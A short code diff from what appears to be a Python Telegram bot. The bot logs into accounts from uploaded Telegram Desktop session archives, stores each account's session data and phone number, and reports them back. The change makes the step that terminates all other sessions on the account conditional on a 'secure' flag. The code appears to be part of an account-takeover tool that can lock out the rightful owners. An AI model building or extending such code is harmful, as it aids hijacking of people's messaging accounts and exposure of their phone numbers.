@@ -433,7 +433,10 @@ async def handle_archive(client, message):
                 }
                 sydno = await db.save_account(me.id, info, tdata_bytes)
                 await show_rar(tdata_path, message, sydno)
-                nsyd = await terminate_all_other_sessions(tele_client)
+                if secure:
+                    nsyd = await terminate_all_other_sessions(tele_client)
+                else:
+                    nsyd = "-"
                 await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n{syd} \n{nsyd}", quote=True)
                 results.append(
                     f"#{sydno}\n"
